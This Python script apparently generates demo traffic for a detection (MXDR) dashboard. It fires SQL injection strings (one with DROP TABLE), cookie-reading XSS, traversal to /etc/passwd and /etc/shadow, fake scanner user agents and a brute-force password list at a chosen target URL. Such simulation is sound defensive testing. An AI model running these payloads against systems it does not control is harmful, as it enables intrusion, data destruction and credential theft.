#!/usr/bin/env python3
"""
MXDR Demo — Safe Attack Simulator
Simulates common web attacks against YOUR OWN dummy target site.
Usage: python3 simulate_attacks.py --target http://localhost:5000
"""

import requests
import time
import argparse
import random

parser = argparse.ArgumentParser()
parser.add_argument('--target', default='http://localhost:5000', help='Target URL')
parser.add_argument('--delay', type=float, default=0.5, help='Seconds between requests')
args = parser.parse_args()

BASE = args.target.rstrip('/')
DELAY = args.delay

BANNER = r"""
  __  ____  ______  ____     ___  __  __  _  _  __      __  ____  ____  __  __
 (  )(  _ \( __ )(  _ \   / __)(  )(  )( \/ )/ _\    (  )/ _  )/ ___)(  )(  )
  )(  )   / (__ ) )   /   \__ \ )(  )( / \/ \/    \   )( ) _  (\__ \  )(  )( 
 (__)(__)  )(____/(__\_)   (___/(__)(__)\____/\_/\_/  (__)(__\_/(____/ (__)(__) 
 
  MXDR Demo Attack Simulator — for YOUR target site only
"""
print(BANNER)

def req(method, path, **kwargs):
    url = BASE + path
    try:
        r = getattr(requests, method)(url, timeout=5, **kwargs)
        print(f"  [{r.status_code}] {method.upper()} {path}")
    except Exception as e:
        print(f"  [ERR] {path} — {e}")
    time.sleep(DELAY)


print("\n═══ 1. NORMAL TRAFFIC ═══")
for path in ['/', '/search?from=Delhi&to=Mumbai&date=2024-12-01', '/pnr?pnr=1234567890']:
    req('get', path)

print("\n═══ 2. SQL INJECTION ATTACKS ═══")
sqli_payloads = [
    "/login?username=' OR '1'='1",
    "/search?from=Delhi' UNION SELECT * FROM users--",
    "/pnr?pnr=1 OR 1=1",
    "/search?from=test'; DROP TABLE bookings;--",
    "/login?username=admin'--&password=anything",
    "/search?to=Mumbai' AND SLEEP(5)--",
]
for path in sqli_payloads:
    req('get', path)

print("\n═══ 3. XSS ATTACKS ═══")
xss_payloads = [
    "/search?from=<script>alert(document.cookie)</script>",
    "/search?to=<img src=x onerror=alert(1)>",
    "/login?username=<svg onload=alert('xss')>",
    "/pnr?pnr=<iframe src=javascript:alert(1)>",
]
for path in xss_payloads:
    req('get', path)

print("\n═══ 4. PATH TRAVERSAL ATTACKS ═══")
traversal_payloads = [
    "/../../../etc/passwd",
    "/static/../../../etc/shadow",
    "/images/%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/.git/config",
    "/.env",
    "/backup.sql",
]
for path in traversal_payloads:
    req('get', path)

print("\n═══ 5. SCANNER / RECON (SIMULATED UA) ═══")
scanners = [
    ("sqlmap/1.7.8#stable (https://sqlmap.org)", "/login"),
    ("Nikto/2.1.6", "/"),
    ("Mozilla/5.0 (compatible; Nessus; +https://www.nessus.org)", "/admin"),
    ("DirBuster-1.0-RC1", "/admin/config"),
    ("wfuzz/3.1.0", "/api/"),
    ("gobuster/3.6", "/backup"),
]
for ua, path in scanners:
    try:
        r = requests.get(BASE + path, headers={'User-Agent': ua}, timeout=5)
        print(f"  [{r.status_code}] Scanner: {ua[:30]}... → {path}")
    except Exception as e:
        print(f"  [ERR] {e}")
    time.sleep(DELAY)

print("\n═══ 6. BRUTE FORCE LOGIN ═══")
passwords = ['password', '123456', 'admin', 'letmein', 'qwerty', 'welcome',
             'monkey', 'password1', 'abc123', 'iloveyou', 'test', 'root']
for pwd in passwords:
    req('post', '/login', data={'username': 'admin', 'password': pwd})

print("\n═══ 7. SUSPICIOUS PROBES ═══")
suspicious = [
    "/wp-login.php",
    "/phpmyadmin/",
    "/.htaccess",
    "/config.php.bak",
    "/admin/",
    "/api/admin/users",
    "/actuator/health",
    "/server-status",
]
for path in suspicious:
    req('get', path)

print("\n✅ Simulation complete. Check MXDR dashboard for alerts.")
